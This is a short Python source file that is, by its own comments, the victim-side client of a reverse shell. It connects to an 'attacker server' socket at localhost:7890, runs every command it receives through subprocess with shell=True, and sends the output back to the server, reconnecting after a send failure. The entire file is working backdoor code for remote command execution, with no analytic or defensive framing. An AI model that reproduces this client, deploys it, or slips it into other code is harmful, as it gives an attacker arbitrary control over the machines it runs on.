import subprocess
from payload import Payload
from secure_socket import SecureSocket


# Attacker server ip and port
ip = "localhost"
port = 7890


# Create the victim socket that keep trying to connect to the server
def create_socket():
    secure_socket = SecureSocket()
    secure_socket.connect()
    while True:
        # Receive data from the server
        data = secure_socket.receive()
        print('Received:'.center(40, "="))
        print(str(data.decode()))

        # Generate command
        stdout, stderr = run_command(data.decode())
        payload = Payload(stdout=stdout, stderr=stderr)
        packet = payload.get_packet()

        try:
            secure_socket.send(packet)
        except:
            create_socket()


# Run a line of shell command and returns the result
# Todo: Keep one subprocess alive
def run_command(cmd):
    call = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result = str(call.stdout.decode("utf-8")), str(call.stderr.decode("utf-8"))
    print(result)
    return str(call.stdout.decode("utf-8")), str(call.stderr.decode("utf-8"))


def main():
    create_socket()


if __name__ == '__main__':
    main()
